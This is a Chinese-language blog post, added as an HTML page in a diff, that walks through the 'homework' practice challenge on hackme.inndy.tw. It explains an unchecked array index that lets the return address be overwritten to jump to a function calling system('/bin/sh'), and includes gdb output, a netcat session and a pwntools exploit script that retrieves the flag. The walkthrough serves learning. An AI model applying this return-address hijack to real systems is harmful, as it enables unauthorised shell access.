@@ -1,0 +1,824 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="nc,cat,stack overflow,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="[src = hackme] homework题目描述1nc hackme.inndy.tw 7701  Source Code, Index out bound, Return Address">
+<meta name="keywords" content="nc,cat,stack overflow">
+<meta property="og:type" content="article">
+<meta property="og:title" content="homework">
+<meta property="og:url" content="http://yoursite.com/2019/10/10/homework/index.html">
+<meta property="og:site_name" content="BitSec&#39;s Blog">
+<meta property="og:description" content="[src = hackme] homework题目描述1nc hackme.inndy.tw 7701  Source Code, Index out bound, Return Address">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2019/10/10/homework/homework1.PNG">
+<meta property="og:image" content="http://yoursite.com/2019/10/10/homework/homework2.PNG">
+<meta property="og:image" content="http://yoursite.com/2019/10/10/homework/homework3.PNG">
+<meta property="og:image" content="http://yoursite.com/2019/10/10/homework/homework4.PNG">
+<meta property="og:updated_time" content="2019-10-10T08:51:28.549Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="homework">
+<meta name="twitter:description" content="[src = hackme] homework题目描述1nc hackme.inndy.tw 7701  Source Code, Index out bound, Return Address">
+<meta name="twitter:image" content="http://yoursite.com/2019/10/10/homework/homework1.PNG">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"right","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/10/10/homework/">
+
+
+
+
+
+  <title>homework | BitSec's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">BitSec's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">天道酬勤，厚德载物</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/10/homework/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="BitSec">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BitSec's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">homework</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-10T13:15:42+08:00">
+                2019-10-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/" itemprop="url" rel="index">
+                    <span itemprop="name">PWN</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="src-hackme-homework"><a href="#src-hackme-homework" class="headerlink" title="[src = hackme] homework"></a>[src = hackme] homework</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc hackme.inndy.tw 7701</span><br></pre></td></tr></table></figure>
+
+<p>Source Code, Index out bound, Return Address</p>
+ <a id="more"></a>
+<h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>题目提示查看源代码，并且注意索引越界（Index out bound），返回地址。<br>查看源代码，</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">run_program</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> arr[<span class="number">10</span>], i, v, act;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">        arr[i] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        ......省略</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;act);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(act) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Index to edit: "</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;i);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"How many? "</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v);</span><br><span class="line">                arr[i] = v;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">         ......省略</span><br></pre></td></tr></table></figure>
+
+<p>发现run_program()中定义了一个数组arr[10], 下面可以通过输入设置其值。但是在case1中赋值时没有检查index的值，导致可以输入任意的索引值，即导致任意地址读写。</p>
+<p>而且在题目的源码中还给出了一个打开shell的函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">call_me_maybe</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因此只要通过选择合适的Index的值，使得arr[Index]的位置巧合是run_program()函数的返回地址，并且将其值设置为call_me_maybe()的地址，则在run_program()返回时，将调用call_me_maybe()打开shell。<br>然后按照PWN的基本思路，在shell中通过cat flag获取flag即可。</p>
+<p>这需要解决两个问题：</p>
+<ol>
+<li>call_me_maybe()的地址；</li>
+<li>run_program()函数返回时返回地址与数组arr[10]的index的关系。</li>
+</ol>
+<p>第一个问题很容易解决，直接IDA打开homework的二进制程序，就可以看到，如图：<br><img src="./homework1.PNG" alt="homework"><br>可以看到call_me_maybe()的地址为0x080485FB。</p>
+<p>第二个问题：获取run_program()函数返回时返回地址与数组arr[10]的index的关系可以通过运行可执行文件，并使用gdb进行调试得到。为了提高调试效率，建议安装gdb的插件pwndbg，具体安装方法可以查阅相关资料，不再赘述。</p>
+<p>首先根据IDA找到case1，在jmp指令（0x080487AF）的位置下断点，来确定index与返回地址位置的关系：</p>
+<p><img src="./homework2.PNG" alt="homework"></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">bitsec@bitsec-ubuntu:~/hackme/homework$ gdb -q ./homework</span><br><span class="line">pwndbg: loaded 173 commands. Type pwndbg [filter] <span class="keyword">for</span> a list.</span><br><span class="line">pwndbg: created <span class="variable">$rebase</span>, <span class="variable">$ida</span> gdb <span class="built_in">functions</span> (can be used with <span class="built_in">print</span>/<span class="built_in">break</span>)</span><br><span class="line">Reading symbols from ./homework...done.</span><br><span class="line">pwndbg&gt; b *0x080487AF</span><br><span class="line">Breakpoint 1 at 0x80487af: file pwn-easy.c, line 59.</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/bitsec/hackme/homework/homework </span><br><span class="line">What<span class="string">'s your name? bitsec</span></span><br><span class="line"><span class="string">0 &gt; exit</span></span><br><span class="line"><span class="string">1 &gt; edit number</span></span><br><span class="line"><span class="string">2 &gt; show number</span></span><br><span class="line"><span class="string">3 &gt; sum</span></span><br><span class="line"><span class="string">4 &gt; dump all numbers</span></span><br><span class="line"><span class="string"> &gt; 1</span></span><br><span class="line"><span class="string">Index to edit: 1</span></span><br><span class="line"><span class="string">How many? 1</span></span><br></pre></td></tr></table></figure>
+
+<p>此时栈状态如图：</p>
+<p><img src="./homework3.PNG" alt="homework"></p>
+<p>可以看出arr[0]的相对地址为0014，返回地址（标识ebp下面的地址）为004c，差为0x38/4=0xe=14.即arr[14]的位置为返回地址的位置，所以只要将arr[14]赋值为0x080485FB（call_me_maybe()的入口地址，对应的10进制为134514171）就可以打开shell。</p>
+<p>其实熟悉栈帧排布的话，直接从IDA–&gt;F5，得到的run_program的源码也能分析出来。如图：</p>
+<p><img src="./homework4.PNG" alt="homework"></p>
+<p>可以看到arr在举例ebp为34h的位置，而ebp下紧挨着就是放回地址，即在ebp+4的位置。所以差为34h+4h=38h，得到同样的结果。</p>
+<p>不要忘记，填充完毕之后，还要输入一个0，执行exit，才能从run_program返回，得到shell。</p>
+<p>具体过程如下：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">bitsec@bitsec-ubuntu:~/hackme/homework$ nc hackme.inndy.tw 7701</span><br><span class="line">What<span class="string">'s your name? bitsec</span></span><br><span class="line"><span class="string">0 &gt; exit</span></span><br><span class="line"><span class="string">1 &gt; edit number</span></span><br><span class="line"><span class="string">2 &gt; show number</span></span><br><span class="line"><span class="string">3 &gt; sum</span></span><br><span class="line"><span class="string">4 &gt; dump all numbers</span></span><br><span class="line"><span class="string"> &gt; 1</span></span><br><span class="line"><span class="string">Index to edit: 14</span></span><br><span class="line"><span class="string">How many? 134514171</span></span><br><span class="line"><span class="string">0 &gt; exit</span></span><br><span class="line"><span class="string">1 &gt; edit number</span></span><br><span class="line"><span class="string">2 &gt; show number</span></span><br><span class="line"><span class="string">3 &gt; sum</span></span><br><span class="line"><span class="string">4 &gt; dump all numbers</span></span><br><span class="line"><span class="string"> &gt; 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cat flag</span></span><br><span class="line"><span class="string">FLAG&#123;Yoooo, Index Over Flow in my home work......OeAbaFeGeLaF9dEQ&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>其实很多情况下通过使用python的pwntool包写pwn的exp程序更有效，上面的过程可以通过下面的代码实现：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process("./homework")    #local debug</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"hackme.inndy.tw"</span>, <span class="number">7701</span>)  <span class="comment">#remote debug</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Input Name</span></span><br><span class="line">io.recvuntil(<span class="string">"name? "</span>)</span><br><span class="line">io.sendline(<span class="string">"Any String"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#overwrite return address</span></span><br><span class="line">io.recvuntil(<span class="string">"dump all numbers"</span>)</span><br><span class="line">io.recvuntil(<span class="string">" &gt; "</span>)</span><br><span class="line">io.sendline(<span class="string">"1"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"edit: "</span>)</span><br><span class="line">io.sendline(<span class="string">"14"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"How many? "</span>)</span><br><span class="line">system_addr = <span class="number">0x080485FB</span></span><br><span class="line">io.sendline(str(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#exit</span></span><br><span class="line">io.recvuntil(<span class="string">"dump all numbers"</span>)</span><br><span class="line">io.recvuntil(<span class="string">" &gt; "</span>)</span><br><span class="line">io.sendline(<span class="string">"0"</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>运行结果如下：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">bitsec@bitsec-ubuntu:~/hackme/homework$ python homework_exp.py </span><br><span class="line">[+] Opening connection to hackme.inndy.tw on port 7701: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">flag</span><br><span class="line">homework</span><br><span class="line">run.sh</span><br><span class="line">$ cat flag</span><br><span class="line">FLAG&#123;Yoooo, Index Over Flow <span class="keyword">in</span> my home work......OeAbaFeGeLaF9dEQ&#125;</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/nc/" rel="tag"># nc</a>
+          
+            <a href="/tags/cat/" rel="tag"># cat</a>
+          
+            <a href="/tags/stack-overflow/" rel="tag"># stack overflow</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/10/10/catflag/" rel="next" title="catflag">
+                <i class="fa fa-chevron-left"></i> catflag
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">BitSec</p>
+              <p class="site-description motion-element" itemprop="description">天道酬勤，厚德载物</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">29</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/bitsec0" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:bitsec@aliyun.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://skysec.top" title="一叶飘零" target="_blank">一叶飘零</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://pupiles.com/" title="Pupil" target="_blank">Pupil</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://cyto.top/" title="Cytosine" target="_blank">Cytosine</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#src-hackme-homework"><span class="nav-number">1.</span> <span class="nav-text">[src = hackme] homework</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#题目描述"><span class="nav-number">2.</span> <span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WP"><span class="nav-number">3.</span> <span class="nav-text">WP</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">BitSec</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
